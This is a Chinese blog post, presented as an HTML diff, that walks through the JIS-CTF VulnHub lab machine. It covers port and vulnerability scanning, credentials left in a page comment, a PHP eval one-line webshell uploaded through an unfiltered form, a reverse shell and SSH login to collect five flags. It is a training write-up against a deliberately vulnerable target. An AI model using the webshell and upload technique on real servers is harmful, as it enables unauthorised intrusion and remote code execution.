@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FJtFPhqPz0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.ydq6.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="JIS-CTF 靶机测试​                                                                                       一、环境搭建从下面网站下载ova文件并导入到virtual box中。 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jis-ctf-vulnupload,228&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JIS-CTF靶机测试">
+<meta property="og:url" content="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="gwolfs的个人博客">
+<meta property="og:description" content="JIS-CTF 靶机测试​                                                                                       一、环境搭建从下面网站下载ova文件并导入到virtual box中。 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jis-ctf-vulnupload,228&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ydq6.com/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png">
+<meta property="article:published_time" content="2020-05-06T14:54:59.000Z">
+<meta property="article:modified_time" content="2020-05-06T15:16:00.266Z">
+<meta property="article:author" content="gwolfs">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ydq6.com/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png">
+
+<link rel="canonical" href="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>JIS-CTF靶机测试 | gwolfs的个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="gwolfs的个人博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">gwolfs的个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head1.png">
+      <meta itemprop="name" content="gwolfs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gwolfs的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JIS-CTF靶机测试
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-06 22:54:59 / 修改时间：23:16:00" itemprop="dateCreated datePublished" datetime="2020-05-06T22:54:59+08:00">2020-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="JIS-CTF-靶机测试"><a href="#JIS-CTF-靶机测试" class="headerlink" title="JIS-CTF 靶机测试"></a>JIS-CTF 靶机测试</h1><p>​                                                                                      </p>
+<h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>从下面网站下载ova文件并导入到virtual box中。</p>
+<p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p>
+<a id="more"></a>
+
+<h2 id="二、找flag"><a href="#二、找flag" class="headerlink" title="二、找flag"></a>二、找flag</h2><h3 id="（1）ip探测"><a href="#（1）ip探测" class="headerlink" title="（1）ip探测"></a>（1）ip探测</h3><p>首先探测靶机的IP地址</p>
+<p>netdiscover -i eth0</p>
+<p>发现mac地址08:00:27:68:18:58对应的ip地址为192.168.1.118</p>
+<h3 id="（2）端口扫描"><a href="#（2）端口扫描" class="headerlink" title="（2）端口扫描"></a>（2）端口扫描</h3><p>扫描下端口、服务和操作系统</p>
+<p>nmap -sV -O 192.168.1.118</p>
+<p>结果:</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2<span class="number">.1</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.18</span> ((Ubuntu))</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.8</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br></pre></td></tr></table></figure>
+
+<p>只开了ssh端口和http端口，且是apache服务器，Ubuntu系统</p>
+<p>（3）扫描下常见漏洞：</p>
+<p>nmap –script=vuln 192.168.1.118</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Host is up (<span class="number">0.00060</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>:<span class="number">80</span>/</span><br><span class="line">|     <span class="type">Form</span> id:</span><br><span class="line">|<span class="type">_</span>    Form action: check_login.php</span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line">|   <span class="type">/admin_area</span>/: Possible admin folder</span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line">|   <span class="type">/admin_area</span>/index.php: Possible admin folder</span><br><span class="line">|   <span class="type">/robots</span>.txt: Robots file</span><br><span class="line">|   <span class="type">/css</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">|<span class="type">_</span>  /js/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">https</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_</span>      http://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）找第一个flag"><a href="#（4）找第一个flag" class="headerlink" title="（4）找第一个flag"></a>（4）找第一个flag</h3><p>有robots敏感目录</p>
+<p>robots.txt文件：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /</span><br><span class="line"><span class="string">Disallow:</span> /backup</span><br><span class="line"><span class="string">Disallow:</span> /admin</span><br><span class="line"><span class="string">Disallow:</span> /admin_area</span><br><span class="line"><span class="string">Disallow:</span> /r00t</span><br><span class="line"><span class="string">Disallow:</span> /uploads</span><br><span class="line"><span class="string">Disallow:</span> /uploaded_files</span><br><span class="line"><span class="string">Disallow:</span> /flag</span><br></pre></td></tr></table></figure>
+
+<p>flag敏感目录很明显，进入拿到第一个flag</p>
+<p>The 1st flag is : {8734509128730458630012095}</p>
+<h3 id="（5）找第二个flag"><a href="#（5）找第二个flag" class="headerlink" title="（5）找第二个flag"></a>（5）找第二个flag</h3><p>再查找其他隐藏目录，一个个的翻，终于在</p>
+<p>admin_area/index.php下找到。</p>
+<p>在第一遍查看时我直接看到这个就跳过了，然后找半天没有办法再一个个仔细看，在这个源代码中发现了第二个flag.</p>
+<p>源代码：</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">Fake admin area :)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>The admin area not work :) <span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--	username : admin</span></span></span><br><span class="line"><span class="xml">	password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="xml">	The 2nd flag is : </span><span class="template-variable">&#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>The 2nd flag is : {7412574125871236547895214}</p>
+<p>而且账户名是admin</p>
+<p>密码是3v1l_H@ck3r</p>
+<h3 id="（6）找第三个flag"><a href="#（6）找第三个flag" class="headerlink" title="（6）找第三个flag"></a>（6）找第三个flag</h3><p>在主页面输入账号密码登录进来</p>
+<p><img src="/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png" alt="image-20180601203736905"></p>
+<p>看来是个文件上传，试一下。</p>
+<p>上传个php文件一句话木马</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[cmd])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>左上角显示SUCCESS，看来没什么过滤。</p>
+<p>不知道上传到哪了，找一下先前禁止的目录中的/uploaded_files和/uploads</p>
+<p>在/uploaded_files/yijuhua.php发现上传的一句话木马，用菜刀连接试试。不知道为什么连不上。换个大马上传下试试。上传小朋友大马再登录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.118</span><span class="regexp">/uploaded_files/</span>xiaopengyou.php</span><br></pre></td></tr></table></figure>
+
+<p>成功连接上</p>
+<p>在根目录下发现文件hint.txt.</p>
+<p>里面有第三个flag</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">3</span>rd flag <span class="keyword">is</span> : &#123;<span class="number">7645110034526579012345670</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有提示：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try <span class="keyword">to</span> <span class="builtin-name">find</span><span class="built_in"> user </span>technawi password <span class="keyword">to</span> read the flag.txt file, you can <span class="builtin-name">find</span> it <span class="keyword">in</span> a hidden file ;)</span><br></pre></td></tr></table></figure>
+
+<p>而且里面还有flag.txt，发现没有权限。看上面的权限需要找到用户technawi的密码，而且提示在一个隐藏文件中。</p>
+<h3 id="（7）找第四个flag"><a href="#（7）找第四个flag" class="headerlink" title="（7）找第四个flag"></a>（7）找第四个flag</h3><p>下一关应该是相当难的，先在大马中反弹shell到自己端口上，然后利用shell进行操作。我找遍了网站下所有文件都没发现含有technawi密码的隐藏文件，因为它说是hidden file，我理解的是隐藏文件，所以一直在用ls查找。找不到了于是在全局找technawi，找半天也没找到对的，因为太多包含technawi的了。最后机智的想到是不是该找下一个flag了，按以前文件的格式应该是the 4th flag is,于是利用</p>
+<p>grep “the 4th flag”    #注意时间会比价慢</p>
+<p>终于在/etc/mysql/conf.d/credentials.txt文件中找出第四个flag</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">4</span>th flag <span class="keyword">is</span> : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : <span class="type">technawi</span></span><br><span class="line">password : 3<span class="type">vilH</span>@ksor</span><br></pre></td></tr></table></figure>
+
+<p>The 4th flag is : {7845658974123568974185412}   </p>
+<h3 id="（7）找第五个flag"><a href="#（7）找第五个flag" class="headerlink" title="（7）找第五个flag"></a>（7）找第五个flag</h3><p>因为先前查找时已经发现flag.txt属于technawi用户，证明可以用technawi登录ssh，于是</p>
+<p>ssh <a href="mailto:technawi@192.168.1.118">technawi@192.168.1.118</a></p>
+<p>然后vim /var/www/html/flag.txt发现第五个flag</p>
+<p>technawi</p>
+<p>The 5th flag is : {5473215946785213456975249}</p>
+<p>Good job :)</p>
+<p>You find 5 flags and got their points and finish the first scenario….</p>
+<p>到此五个flag全部找出。</p>
+<p>[注]后来去网上寻找才发现直接用</p>
+<p>find / -user technawi 2&gt;/dev/null 寻找更快</p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\pwnlab靶机测试\" rel="bookmark">pwnlab靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\SkyConCTF2016靶机测试\" rel="bookmark">SkyConCTF2016靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\JS学习\" rel="bookmark">JS学习</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_sql注入\" rel="bookmark">合天培训_实验_sql注入</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_web安全之HTTP头部字段理解\" rel="bookmark">合天培训_实验_web安全之HTTP头部字段理解</a></div>
+    </li>
+  </ul>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"><i class="fa fa-tag"></i>靶机</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i>web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/" rel="prev" title="合天培训_实验_sql注入">
+      <i class="fa fa-chevron-left"></i> 合天培训_实验_sql注入
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/web/JS%E5%AD%A6%E4%B9%A0/" rel="next" title="JS学习">
+      JS学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JIS-CTF-靶机测试"><span class="nav-text">JIS-CTF 靶机测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、环境搭建"><span class="nav-text">一、环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、找flag"><span class="nav-text">二、找flag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（1）ip探测"><span class="nav-text">（1）ip探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（2）端口扫描"><span class="nav-text">（2）端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（4）找第一个flag"><span class="nav-text">（4）找第一个flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（5）找第二个flag"><span class="nav-text">（5）找第二个flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（6）找第三个flag"><span class="nav-text">（6）找第三个flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（7）找第四个flag"><span class="nav-text">（7）找第四个flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（7）找第五个flag"><span class="nav-text">（7）找第五个flag</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gwolfs"
+      src="/images/head1.png">
+  <p class="site-author-name" itemprop="name">gwolfs</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/TataYdq" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TataYdq" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1937441951@qq.com" title="E-Mail → mailto:1937441951@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+<!-- CloudCalendar -->
+<div class="widget-wrap" style="width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;">
+	<div class="widget" id="CloudCalendar"></div>
+</div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备19000724号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802028114" rel="noopener" target="_blank">京公网安备 11010802028114号 </a>
+  </div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gwolfs</span>
+</div>
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共16.6k字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
